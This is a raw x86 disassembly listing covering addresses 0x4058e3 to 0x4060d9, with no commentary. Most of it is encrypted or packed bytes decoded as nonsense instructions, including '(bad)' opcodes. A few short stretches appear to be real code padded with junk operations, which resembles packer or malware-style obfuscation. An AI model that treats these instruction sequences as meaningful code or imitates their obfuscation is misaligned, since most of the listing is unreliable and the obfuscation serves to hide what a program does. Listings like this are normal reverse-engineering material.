  4058e3:	mov    ch,0x12
  4058e5:	push   ebp
  4058e6:	in     al,0x64
  4058e8:	or     ebp,DWORD PTR [ecx+ebp*2+0x62]
  4058ec:	imul   esp,ecx,0x321693e7
  4058f2:	mov    dh,0x5e
  4058f4:	loopne 0x4058e3
  4058f6:	icebp  
  4058f7:	pop    ebp
  4058f8:	fnsave [edi+0x2e]
  4058fb:	scas   eax,DWORD PTR es:[edi]
  4058fc:	aas    
  4058fd:	fnsave [edi-0x1b]
  405900:	cli    
  405901:	pop    ds
  405902:	xlat   BYTE PTR ds:[ebx]
  405903:	shr    BYTE PTR [ecx+eiz*2],cl
  405906:	jmp    0xb9e2182d
  40590b:	(bad)  
  40590c:	lods   al,BYTE PTR ds:[esi]
  40590d:	mov    bh,0x26
  40590f:	add    eax,ecx
  405911:	outs   dx,DWORD PTR ds:[esi]
  405912:	clc    
  405913:	cld    
  405914:	test   al,0x4d
  405916:	xchg   DWORD PTR [ecx],ebp
  405918:	mov    bl,0x49
  40591a:	stos   BYTE PTR es:[edi],al
  40591b:	sub    BYTE PTR [ecx+edi*4],bl
  40591e:	test   BYTE PTR [ebx],cl
  405920:	out    0xb6,eax
  405922:	out    0xba,eax
  405924:	arpl   cx,ax
  405926:	dec    ebx
  405927:	jno    0x40590f
  405929:	fidiv  DWORD PTR [ebp+0x1d]
  40592c:	mov    bh,0x5
  40592e:	adc    DWORD PTR [ebp+0x5c],0x1f5a3416
  405935:	mov    ch,0x24
  405937:	(bad)  
  405938:	idiv   BYTE PTR [edi+0x2c]
  40593b:	jnp    0x40594d
  40593d:	sahf   
  40593e:	xor    eax,0xb2a15b7d
  405943:	sar    BYTE PTR [eax+0x53],0x7
  405947:	mov    edx,DWORD PTR [ecx+ebx*4-0x53ce9fec]
  40594e:	and    al,0x3e
  405950:	nop
  405951:	ss mov ebx,0xa5c34c06
  405957:	aaa    
  405958:	cs iret 
  40595a:	shl    dh,0x55
  40595d:	jmp    0x501e:0xc1e4196a
  405964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405965:	mov    ah,0x19
  405967:	dec    eax
  405968:	xor    eax,0xaa769fbf
  40596d:	push   es
  40596e:	aad    0xff
  405970:	fwait
  405971:	idiv   DWORD PTR [edx]
  405973:	xchg   ch,dh
  405975:	ret    0xee21
  405978:	mov    ecx,fs
  40597a:	scas   al,BYTE PTR es:[edi]
  40597b:	sub    eax,0xc8a3f91a
  405980:	shr    BYTE PTR [eax],0xd
  405983:	mov    DWORD PTR [eax+0x50e8a054],ebp
  405989:	adc    al,0x1a
  40598b:	sbb    BYTE PTR [ebx-0x7f],0xc4
  40598f:	push   esi
  405990:	gs jp  0x4059cd
  405993:	aam    0xc9
  405995:	stos   DWORD PTR es:[edi],eax
  405996:	sbb    edi,edx
  405998:	gs js  0x405a0a
  40599b:	push   ebx
  40599c:	dec    edi
  40599d:	jb     0x405927
  40599f:	hlt    
  4059a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a1:	shr    BYTE PTR [ebp-0x6d],0x9f
  4059a5:	repnz mov esp,0xb09f21d3
  4059ab:	das    
  4059ac:	test   DWORD PTR [eax-0x7a82372f],ecx
  4059b2:	cld    
  4059b3:	lods   al,BYTE PTR ds:[esi]
  4059b4:	gs inc ebp
  4059b6:	fcom   DWORD PTR [edi-0x56]
  4059b9:	add    DWORD PTR [ecx],eax
  4059bb:	lods   al,BYTE PTR ds:[esi]
  4059bc:	cmp    cl,BYTE PTR [esp+edi*2+0x3da9799e]
  4059c3:	mov    db7,eax
  4059c6:	cmp    BYTE PTR [eax+0x7],cl
  4059c9:	sub    BYTE PTR [ebp-0x60076781],0xee
  4059d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d1:	jmp    0x405a30
  4059d3:	rcl    BYTE PTR [edi+ebx*2+0x29],1
  4059d7:	dec    ebp
  4059d8:	cmp    eax,0x60da863a
  4059dd:	jb     0x405973
  4059df:	jg     0x4059ff
  4059e1:	pop    ebp
  4059e2:	repnz pop eax
  4059e4:	pushf  
  4059e5:	inc    DWORD PTR [ecx+0x75]
  4059e8:	add    al,0xd6
  4059ea:	xor    bl,BYTE PTR [ebp-0x40]
  4059ed:	mov    edx,?
  4059ef:	or     al,0xd8
  4059f1:	sar    BYTE PTR [ebx],1
  4059f3:	les    esi,FWORD PTR [edi+0x6]
  4059f6:	icebp  
  4059f7:	fwait
  4059f8:	sbb    BYTE PTR [ebx],bh
  4059fa:	outs   dx,BYTE PTR ds:[esi]
  4059fb:	mov    bl,0x7b
  4059fd:	dec    ecx
  4059fe:	cmc    
  4059ff:	test   DWORD PTR [edx],eax
  405a01:	mov    ch,0x22
  405a03:	sub    ch,dh
  405a05:	les    esp,FWORD PTR [esi+0x7e]
  405a08:	push   ebp
  405a09:	loope  0x405a0c
  405a0b:	or     al,0x8d
  405a0d:	jns    0x405a28
  405a0f:	inc    ebp
  405a10:	and    al,0xd2
  405a12:	push   edx
  405a13:	adc    eax,0x8e8ad1dd
  405a18:	push   cs
  405a19:	jp     0x405a2e
  405a1b:	ret    0xbfbd
  405a1e:	inc    ebx
  405a1f:	inc    ebp
  405a20:	xchg   edi,ebx
  405a22:	mov    ss,WORD PTR [edx-0x6d]
  405a25:	pusha  
  405a26:	outs   dx,BYTE PTR ss:[esi]
  405a28:	retf   
  405a29:	popa   
  405a2a:	cmc    
  405a2b:	(bad)  
  405a2c:	jb     0x4059c0
  405a2e:	pop    es
  405a2f:	mov    ecx,0x45c7ba5b
  405a34:	cld    
  405a35:	xor    al,0x85
  405a37:	pushf  
  405a38:	clc    
  405a39:	and    DWORD PTR ds:0x43355b,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x43366f
  405a48:	xor    DWORD PTR ds:0x433543,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433667,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43353f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43361b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43361b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43361b,ecx
  405a80:	cmp    DWORD PTR ds:0x43361b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43361b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43357b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433657,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0xe4d28f4,0x46aca634
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405b38
  405add:	sub    eax,0xc08a9f2
  405ae2:	adc    dh,BYTE PTR [ecx]
  405ae4:	cmp    BYTE PTR [eax+ebp*4],0x86
  405ae8:	mov    WORD PTR [eax],cs
  405aea:	loopne 0x405b4c
  405aec:	sbb    al,0x56
  405aee:	mov    edx,0x756a88e0
  405af3:	in     eax,0x5
  405af5:	scas   al,BYTE PTR es:[edi]
  405af6:	outs   dx,BYTE PTR ds:[esi]
  405af7:	xchg   ebp,eax
  405af8:	inc    edi
  405af9:	dec    ebp
  405afa:	mov    ebx,0x68e4aeb8
  405aff:	stos   DWORD PTR es:[edi],eax
  405b00:	stos   BYTE PTR es:[edi],al
  405b01:	cwde   
  405b02:	bound  ebx,QWORD PTR [ebp+0x23]
  405b05:	sub    esi,edx
  405b07:	inc    esp
  405b08:	dec    ecx
  405b09:	call   0xfcbf:0x530b4e0e
  405b10:	mov    al,ds:0x41651840
  405b15:	stos   DWORD PTR es:[edi],eax
  405b16:	dec    edx
  405b17:	dec    edx
  405b18:	clc    
  405b19:	cli    
  405b1a:	sub    ch,BYTE PTR [edi-0x3f]
  405b1d:	cmp    eax,DWORD PTR [ecx-0x44395966]
  405b23:	aas    
  405b24:	cmp    ebp,esi
  405b26:	pop    ebp
  405b27:	sbb    al,0x2e
  405b29:	add    BYTE PTR [ebx+0x2d],0xe
  405b2d:	mov    eax,0x27cf192a
  405b32:	shr    BYTE PTR [ebx+edi*1-0x26864e1b],0xed
  405b3a:	mov    WORD PTR [esi+eax*8],ds
  405b3d:	jge    0x405b63
  405b3f:	repnz loope 0x405b7c
  405b42:	cdq    
  405b43:	daa    
  405b44:	push   ebp
  405b45:	push   es
  405b46:	xlat   BYTE PTR ds:[ebx]
  405b47:	js     0x405b03
  405b49:	push   eax
  405b4a:	xor    al,0xad
  405b4c:	hlt    
  405b4d:	retf   0xdaa3
  405b50:	addr16 push ds
  405b52:	test   al,0xa9
  405b54:	push   eax
  405b55:	mov    esi,0x558f6313
  405b5a:	pop    edx
  405b5b:	es scas eax,DWORD PTR es:[edi]
  405b5d:	adc    ebx,DWORD PTR [eax-0x3e]
  405b60:	push   eax
  405b61:	or     BYTE PTR [edx],ah
  405b63:	adc    eax,0x6efa236
  405b68:	lods   al,BYTE PTR ds:[esi]
  405b69:	iret   
  405b6a:	add    BYTE PTR [ecx-0xf],0x78
  405b6e:	repz mov al,ds:0xb4d7aa17
  405b74:	mov    ds:0xfb7ead40,eax
  405b79:	mov    ds:0x479f293b,al
  405b7e:	cld    
  405b7f:	daa    
  405b80:	jo     0x405bfd
  405b82:	inc    esp
  405b83:	push   esi
  405b84:	fst    QWORD PTR [edx-0x78]
  405b87:	jp     0x405b97
  405b89:	test   eax,0xd8f78994
  405b8e:	xor    edi,ecx
  405b90:	aad    0x87
  405b92:	cmp    BYTE PTR [edi+eiz*8],cl
  405b95:	push   ss
  405b96:	and    ah,BYTE PTR [esi+0x346e9522]
  405b9c:	inc    ecx
  405b9d:	fcom   QWORD PTR [ecx+0x23]
  405ba0:	push   0xfc2baf65
  405ba5:	pop    ebp
  405ba6:	mov    eax,0x13787c20
  405bab:	iret   
  405bac:	gs jne 0x405b56
  405baf:	xlat   BYTE PTR ds:[ebx]
  405bb0:	mov    cl,0x1
  405bb2:	inc    esp
  405bb3:	ret    0xe052
  405bb6:	(bad)  
  405bb7:	xlat   BYTE PTR ds:[ebx]
  405bb8:	repnz call 0xd89a:0x8f9c40d1
  405bc0:	jg     0x405ba5
  405bc2:	mov    ebp,0xac0fc54
  405bc7:	ret    
  405bc8:	and    al,0xc2
  405bca:	in     eax,dx
  405bcb:	push   ebp
  405bcc:	test   ebp,0xa2fe247b
  405bd2:	(bad)
  405bd6:	mov    cl,bl
  405bd8:	pop    ebx
  405bd9:	pop    ebp
  405bda:	push   edx
  405bdb:	jle    0x405b7f
  405bdd:	loope  0x405c4d
  405bdf:	pop    esi
  405be0:	stos   DWORD PTR es:[edi],eax
  405be1:	jl     0x405bf1
  405be3:	fcom   DWORD PTR [edx-0x17]
  405be6:	xor    al,BYTE PTR [ecx]
  405be8:	xchg   ebp,eax
  405be9:	mov    bh,0xfc
  405beb:	mov    ecx,DWORD PTR [edx]
  405bed:	sbb    ch,BYTE PTR [edx+ebp*8-0x54a20347]
  405bf4:	adc    edi,0xffffffc1
  405bf7:	test   eax,0xa60b19be
  405bfc:	sete   BYTE PTR [edx-0xf]
  405c00:	stos   BYTE PTR es:[edi],al
  405c01:	nop
  405c02:	loop   0x405b8b
  405c04:	mov    bl,0x4c
  405c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c07:	lock jmp 0x405c60
  405c0a:	mov    ebx,0x791dae74
  405c0f:	sub    eax,0xc6f639ff
  405c14:	repnz cmc 
  405c16:	pop    ecx
  405c17:	stc    
  405c18:	and    al,0xd2
  405c1a:	jmp    0x8acf:0x26e13c83
  405c21:	shr    bh,cl
  405c23:	mov    DWORD PTR [ecx+0x42c48be6],ebp
  405c29:	adc    bl,BYTE PTR [edi-0x3a]
  405c2c:	ins    DWORD PTR es:[edi],dx
  405c2d:	gs push cs
  405c2f:	retf   0xdd14
  405c32:	jmp    0x8970:0x6e906982
  405c39:	pop    edx
  405c3a:	adc    eax,0xd52fcd2c
  405c3f:	(bad)  
  405c40:	ficomp WORD PTR [ebp+0x18]
  405c43:	idiv   DWORD PTR [ebp+0x47e2ad7d]
  405c49:	mov    eax,ds:0xb230c2cd
  405c4e:	mov    al,0x74
  405c50:	mov    DWORD PTR [edi],ebx
  405c52:	push   esp
  405c53:	push   ecx
  405c54:	pop    esp
  405c55:	in     eax,0x62
  405c57:	test   ebp,esp
  405c59:	fwait
  405c5a:	inc    edi
  405c5b:	sub    dh,BYTE PTR [bp+di+0x7f]
  405c5f:	push   ecx
  405c60:	or     edx,DWORD PTR [ecx]
  405c62:	dec    ecx
  405c63:	int3   
  405c64:	es ret 
  405c66:	pop    edx
  405c67:	push   0xc0576922
  405c6c:	imul   esi,DWORD PTR [edi-0x59],0x26
  405c70:	sahf   
  405c71:	rcr    esi,1
  405c73:	pop    ss
  405c74:	in     al,0x33
  405c76:	inc    ebx
  405c77:	rcl    DWORD PTR [edi-0x27],cl
  405c7a:	mov    edx,0xd7410625
  405c7f:	es test dl,bl
  405c82:	sbb    DWORD PTR [ecx+0x7],esp
  405c85:	das    
  405c86:	xchg   esp,eax
  405c87:	stc    
  405c88:	bound  esi,QWORD PTR [ecx]
  405c8a:	mov    edi,0x93314cb2
  405c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c90:	adc    esi,DWORD PTR [ebx]
  405c92:	int3   
  405c93:	xchg   BYTE PTR [edx+eiz*2],bh
  405c96:	mov    bl,BYTE PTR [ebx-0x4e]
  405c99:	popa   
  405c9a:	dec    edx
  405c9b:	popa   
  405c9c:	sbb    edi,DWORD PTR [esi-0x4a]
  405c9f:	scas   al,BYTE PTR es:[edi]
  405ca0:	shl    DWORD PTR [esi+0x2a122ffc],cl
  405ca6:	mov    ecx,0xe0953a7a
  405cab:	pop    eax
  405cac:	inc    edi
  405cad:	pop    edi
  405cae:	mov    eax,ds:0x2e60fb90
  405cb3:	out    0xbb,eax
  405cb5:	les    ebp,FWORD PTR ds:0x21dc2212
  405cbb:	into   
  405cbc:	js     0x405c5b
  405cbe:	ins    DWORD PTR es:[edi],dx
  405cbf:	adc    ecx,DWORD PTR [eax-0x70]
  405cc2:	xor    al,0xb1
  405cc4:	les    eax,FWORD PTR [edx-0x1d]
  405cc7:	repz in eax,dx
  405cc9:	stc    
  405cca:	pop    esp
  405ccb:	nop
  405ccc:	sbb    DWORD PTR [esi],ebx
  405cce:	sub    DWORD PTR [esi],0x8710709c
  405cd4:	adc    ebx,DWORD PTR [ebp-0xc]
  405cd7:	test   al,0xbc
  405cd9:	cmp    DWORD PTR [edx-0x373a7212],edx
  405cdf:	mov    ch,ch
  405ce1:	mov    eax,ds:0x15de827c
  405ce6:	shr    DWORD PTR [edx+0x6515c3b0],1
  405cec:	add    al,0xb0
  405cee:	ins    BYTE PTR es:[edi],dx
  405cef:	fucomp st(7)
  405cf1:	ss jns 0x405caa
  405cf4:	popa   
  405cf5:	test   eax,0x7ceb32b8
  405cfa:	dec    ebp
  405cfc:	ins    DWORD PTR es:[edi],dx
  405cfd:	adc    bl,BYTE PTR [ebx-0x226d8187]
  405d03:	and    al,0x2d
  405d05:	push   edx
  405d06:	pop    ds
  405d07:	or     BYTE PTR [edi+0x72fc0848],ah
  405d0d:	sbb    edx,DWORD PTR [ebp+eax*4+0x51]
  405d11:	xchg   edx,eax
  405d12:	adc    DWORD PTR [edi-0x4515fb60],eax
  405d18:	and    bl,BYTE PTR [eax]
  405d1a:	dec    esp
  405d1b:	add    al,0x58
  405d1d:	hlt    
  405d1e:	jae    0x405d39
  405d20:	mov    ebx,DWORD PTR [edi+0x62fb5cd4]
  405d26:	out    dx,eax
  405d27:	push   ss
  405d28:	cld    
  405d29:	into   
  405d2a:	xor    DWORD PTR [ebx],esi
  405d2c:	dec    ecx
  405d2d:	inc    BYTE PTR [edi]
  405d2f:	xor    al,0xc1
  405d31:	mov    ah,BYTE PTR [eax-0x77797f70]
  405d37:	int    0x98
  405d39:	ror    DWORD PTR [eax+0x41],0xea
  405d3d:	and    al,0x94
  405d3f:	aad    0xb7
  405d41:	or     BYTE PTR [eax*4+0x67d0b9ec],0x81
  405d49:	inc    ebx
  405d4a:	pop    es
  405d4b:	nop
  405d4c:	pop    ebx
  405d4d:	and    DWORD PTR [esi+0x7],ecx
  405d50:	jmp    0x307dd58e
  405d55:	neg    dl
  405d57:	dec    ecx
  405d58:	mov    ch,0x9
  405d5a:	out    0x50,eax
  405d5c:	enter  0xa59c,0x2d
  405d60:	push   edx
  405d61:	push   DWORD PTR [esi+0x9]
  405d64:	aad    0x48
  405d66:	adc    dl,BYTE PTR [esi+0x230426d7]
  405d6c:	jmp    0x1938:0x8824387a
  405d73:	stos   BYTE PTR es:[edi],al
  405d74:	adc    edx,DWORD PTR [edx]
  405d76:	mov    dh,0x77
  405d78:	or     BYTE PTR [ebp+0x61190bb],bl
  405d7e:	aaa    
  405d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d81:	xchg   ecx,eax
  405d82:	pop    edx
  405d83:	enter  0x50df,0x66
  405d87:	dec    DWORD PTR [edx-0x18]
  405d8a:	hlt    
  405d8b:	cmp    bh,cl
  405d8d:	pop    esp
  405d8e:	test   DWORD PTR gs:[edx-0x3927509e],edx
  405d95:	mov    cl,0xef
  405d97:	xchg   DWORD PTR [eax-0x1e2ec361],ebx
  405d9d:	push   0x74
  405d9f:	fs mov ah,0x9b
  405da2:	xchg   esi,eax
  405da3:	stos   BYTE PTR es:[edi],al
  405da4:	mov    ?,WORD PTR [eax+esi*1]
  405da7:	sbb    DWORD PTR [ecx+0x2f0e06fb],ebp
  405dad:	enter  0xca78,0xd0
  405db1:	jmp    0xa3c781c2
  405db6:	pmovmskb esi,mm2
  405db9:	in     al,0xc5
  405dbb:	pusha  
  405dbc:	push   es
  405dbd:	mov    ds,eax
  405dbf:	in     eax,dx
  405dc0:	(bad)  
  405dc1:	ret    
  405dc2:	push   esp
  405dc3:	stc    
  405dc4:	mov    esi,0xb4926aca
  405dc9:	and    dh,BYTE PTR [eax-0x5e]
  405dcc:	iret   
  405dcd:	or     BYTE PTR [edi+0x4c],cl
  405dd0:	or     BYTE PTR [edx+ebp*1+0x7d],0xd
  405dd5:	pop    edx
  405dd6:	jo     0x405e3d
  405dd8:	fist   DWORD PTR [eax+eax*1]
  405ddb:	and    dl,BYTE PTR [edx]
  405ddd:	mov    ebp,0xd481474e
  405de2:	mov    si,0x885c
  405de6:	in     eax,dx
  405de7:	dec    ebx
  405de8:	push   edx
  405de9:	xchg   esi,eax
  405dea:	jge    0x405e12
  405dec:	push   0xca79df9d
  405df1:	call   0x8811:0xcaa133bb
  405df8:	sbb    cl,dh
  405dfa:	inc    esp
  405dfb:	cmp    dh,dh
  405dfd:	sbb    ebp,DWORD PTR ds:0x647a
  405e02:	js     0x405e3a
  405e04:	mov    es,WORD PTR [eax]
  405e06:	sbb    eax,0x9305c364
  405e0b:	push   edx
  405e0c:	js     0x405dc3
  405e0e:	cmp    ah,0xc
  405e11:	mov    bh,0x77
  405e13:	mov    DWORD PTR [ebp-0x71ec2c7c],edx
  405e19:	mov    bl,0xd0
  405e1b:	ins    DWORD PTR es:[edi],dx
  405e1c:	or     al,0x92
  405e1e:	cmc    
  405e1f:	call   0xb235:0x56e58ac3
  405e26:	arpl   WORD PTR [eax+ebp*2-0x39849ef1],dx
  405e2d:	pop    ds
  405e2e:	lds    edx,FWORD PTR [edi+0x4d751895]
  405e34:	fsubr  DWORD PTR [edi]
  405e36:	aad    0x7e
  405e38:	adc    BYTE PTR [eax-0x47],ch
  405e3b:	inc    ebx
  405e3c:	cs dec ecx
  405e3e:	outs   dx,DWORD PTR ds:[esi]
  405e3f:	pop    edx
  405e40:	fbld   TBYTE PTR [edx+0x21096904]
  405e46:	xor    esp,DWORD PTR [edi]
  405e48:	xchg   ebx,eax
  405e49:	mov    cl,al
  405e4b:	mov    edi,0x2571385f
  405e50:	push   0xffffffa8
  405e52:	lock and al,0xe3
  405e55:	mov    ds:0xc2b4f9a4,al
  405e5a:	push   edx
  405e5b:	push   edi
  405e5c:	mov    dh,0xf4
  405e5e:	sub    al,0x76
  405e60:	clc    
  405e61:	mov    bh,0x8b
  405e63:	pop    ss
  405e64:	aas    
  405e65:	scas   al,BYTE PTR es:[edi]
  405e66:	ret    
  405e67:	retf   0x5a3e
  405e6a:	(bad)
  405e6e:	push   ds
  405e6f:	xor    al,0x93
  405e71:	dec    BYTE PTR [ebp+0x5f]
  405e74:	push   es
  405e75:	mov    edi,0xb326c943
  405e7a:	(bad)  [ecx+0x75d3a146]
  405e80:	arpl   sp,di
  405e82:	push   ss
  405e83:	pop    ebx
  405e84:	mov    edi,0x377dce60
  405e89:	pop    ecx
  405e8a:	jg     0x405ed7
  405e8c:	jns    0x405eb6
  405e8e:	pop    ecx
  405e8f:	lods   eax,DWORD PTR ds:[esi]
  405e90:	or     eax,0xc1032d08
  405e95:	imul   eax,esi
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0xcea0b4a0
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	pop    eax
  405ee3:	jns    0x405f49
  405ee5:	jecxz  0x405e71
  405ee7:	int3   
  405ee8:	and    BYTE PTR [esi-0x29],al
  405eeb:	cdq    
  405eec:	(bad)
  405ef0:	push   ss
  405ef1:	std    
  405ef2:	mov    esi,es
  405ef4:	fs jno 0x405e9b
  405ef7:	enter  0x315d,0xd9
  405efb:	rol    DWORD PTR [ecx],1
  405efd:	pop    ebx
  405efe:	mov    bl,0x0
  405f00:	addr16 cwde 
  405f02:	xor    BYTE PTR [edx],bh
  405f04:	imul   ebx,DWORD PTR [edx],0xffffffd5
  405f07:	inc    ecx
  405f08:	test   al,cl
  405f0a:	sbb    dl,BYTE PTR [edi]
  405f0c:	mov    eax,ds:0x6c74bae9
  405f11:	cmp    eax,DWORD PTR [edi]
  405f13:	mov    ds:0x5b6d5a3,al
  405f18:	cmp    BYTE PTR [eax],al
  405f1a:	shl    DWORD PTR fs:[ecx+ebx*2+0x13],0x15
  405f20:	or     BYTE PTR [edi+0x643dc726],ah
  405f26:	jp     0x405f7b
  405f28:	mov    ah,0xc
  405f2a:	add    eax,0xf000e8ab
  405f2f:	mov    dl,BYTE PTR [ebx+edi*8+0x40]
  405f33:	jmp    0x80f47df0
  405f38:	or     al,0x68
  405f3a:	inc    esp
  405f3b:	daa    
  405f3c:	or     dl,BYTE PTR [eax+0xeeed159]
  405f42:	pop    edx
  405f43:	mul    BYTE PTR [eax]
  405f45:	out    dx,eax
  405f46:	xor    dh,BYTE PTR [edx-0x29]
  405f49:	cs mov ebp,0x7e4c6fae
  405f4f:	dec    esi
  405f50:	dec    ecx
  405f51:	ja     0x405ed5
  405f53:	add    eax,0x37a6473a
  405f58:	sti    
  405f59:	xor    al,0x33
  405f5b:	add    ah,dl
  405f5d:	push   edi
  405f5e:	push   0xffffffea
  405f60:	jne    0x405fd4
  405f62:	pusha  
  405f63:	xchg   esp,eax
  405f64:	add    BYTE PTR [edi+0x6d],0xf5
  405f68:	retf   
  405f69:	sbb    eax,DWORD PTR [esi+0xbc0e690]
  405f6f:	loop   0x405efa
  405f71:	push   eax
  405f72:	rcl    ecx,1
  405f74:	out    0x1c,al
  405f76:	push   ds
  405f77:	movzx  ebx,BYTE PTR [esi-0x3664a077]
  405f7e:	dec    esp
  405f7f:	mov    eax,ds:0x22e4d8a6
  405f84:	jb     0x405fb7
  405f86:	sub    al,BYTE PTR [ebp-0x5d129baf]
  405f8c:	sbb    BYTE PTR [ebx-0x7c],dh
  405f8f:	(bad)  
  405f90:	adc    BYTE PTR [edx],al
  405f92:	sbb    edi,DWORD PTR [ecx+0x3e33201b]
  405f98:	outs   dx,BYTE PTR ds:[esi]
  405f99:	jge    0x405ffc
  405f9b:	push   edx
  405f9c:	loopne 0x405f5e
  405f9e:	mov    bl,0x43
  405fa0:	test   al,0x86
  405fa2:	and    al,0x4c
  405fa4:	push   esp
  405fa5:	mov    cl,0xc9
  405fa7:	fcmove st,st(5)
  405fa9:	mov    edi,0xe63ca0b2
  405fae:	mov    ds:0xc396d86b,al
  405fb3:	cmp    esi,esp
  405fb5:	pop    es
  405fb6:	test   al,0x7
  405fb8:	test   al,0x7c
  405fba:	test   eax,0x2c674d51
  405fbf:	jecxz  0x405fe3
  405fc1:	mov    ecx,0x48fa65b8
  405fc6:	je     0x406036
  405fc8:	lea    edx,[ebp-0x1eeb4816]
  405fce:	and    cl,bl
  405fd0:	je     0x405f68
  405fd2:	fmul   QWORD PTR [ecx+0x7b9db2b6]
  405fd8:	jne    0x405f77
  405fda:	adc    al,0xa9
  405fdc:	mov    al,0xae
  405fde:	pushf  
  405fdf:	pop    esi
  405fe0:	dec    eax
  405fe1:	sbb    ebp,DWORD PTR [edi+0x71]
  405fe4:	cld    
  405fe5:	inc    BYTE PTR [ecx-0x5bb7aea3]
  405feb:	addr16 cmp esp,edi
  405fee:	pop    eax
  405fef:	mov    cl,0xc1
  405ff1:	scas   al,BYTE PTR es:[edi]
  405ff2:	rdtsc  
  405ff4:	xor    al,0x46
  405ff6:	lods   eax,DWORD PTR ds:[esi]
  405ff7:	inc    eax
  405ff8:	jnp    0x406045
  405ffa:	mov    al,BYTE PTR [eax+0x5]
  405ffd:	push   ecx
  405ffe:	mov    ds:0x4e7bf219,al
  406003:	out    0x46,al
  406005:	ror    BYTE PTR [esi-0x79f941b9],0xf2
  40600c:	pop    ebp
  40600d:	mov    edi,0xc4dc2b64
  406012:	jmp    0x40605c
  406014:	inc    eax
  406015:	mov    ecx,0xb880ec77
  40601a:	jp     0x40602a
  40601c:	mov    al,0xe8
  40601e:	retf   0x92de
  406021:	xor    bl,BYTE PTR [esi]
  406023:	sbb    ch,bh
  406025:	xor    ah,BYTE PTR [ebx+0x57]
  406028:	lea    esi,[eax+0x5684990c]
  40602e:	sub    DWORD PTR ds:0x75c4be9,0xf88a920b
  406038:	repz xchg edx,eax
  40603a:	xchg   ecx,eax
  40603b:	test   eax,0x175d695
  406040:	leave  
  406041:	rol    DWORD PTR [esi-0x73],cl
  406044:	xchg   esi,eax
  406045:	inc    eax
  406046:	sar    DWORD PTR [edx+0x6250ba01],0xc4
  40604d:	xor    bl,BYTE PTR [edx+ecx*1-0x7f1c70a1]
  406054:	test   eax,0x6470adb0
  406059:	lock mov edx,DWORD PTR ds:0x885587b8
  406060:	push   ebx
  406061:	lods   al,BYTE PTR ds:[esi]
  406062:	cmp    al,0xa8
  406064:	les    edi,FWORD PTR es:[ecx-0x40]
  406068:	cld    
  406069:	xor    DWORD PTR [ebx+0x6eecc194],ecx
  40606f:	jmp    0xb10a:0x1b426009
  406076:	popf   
  406077:	inc    eax
  406078:	icebp  
  406079:	jno    0x406087
  40607b:	(bad)  
  40607c:	(bad)  
  40607d:	(bad)  
  40607e:	push   edi
  40607f:	jmp    0x2b114867
  406084:	cmp    al,BYTE PTR [ebp+0x45b7965c]
  40608a:	fcomp  st(1)
  40608c:	or     BYTE PTR [ebp-0x5011f399],0x9a
  406093:	pop    ecx
  406094:	sub    eax,0x79ec2349
  406099:	aas    
  40609a:	dec    eax
  40609b:	mov    ds:0xd0641ec9,al
  4060a0:	cmp    edx,DWORD PTR fs:[eax]
  4060a3:	fcmovne st,st(4)
  4060a5:	pop    es
  4060a6:	mov    ah,0x15
  4060a8:	popa   
  4060a9:	loope  0x406077
  4060ab:	inc    esp
  4060ac:	sub    DWORD PTR [ebx-0x5a646526],0xda3cc6c3
  4060b6:	add    dh,cl
  4060b8:	in     al,0x9
  4060ba:	mov    ecx,0x7c95fe1e
  4060bf:	sub    eax,0xfe83043e
  4060c4:	mov    al,0x4b
  4060c6:	icebp  
  4060c7:	repnz mov DWORD PTR [ecx-0xe],edx
  4060cb:	ficom  WORD PTR [ebx]
  4060cd:	mov    cl,0x2b
  4060cf:	lods   eax,DWORD PTR ds:[esi]
  4060d0:	and    ecx,DWORD PTR [eax+0x4a]
  4060d3:	push   esi
  4060d4:	ret    
  4060d5:	pop    esp
  4060d6:	fwait
  4060d7:	js     0x40610d
  4060d9:	mov    bh,0x3d
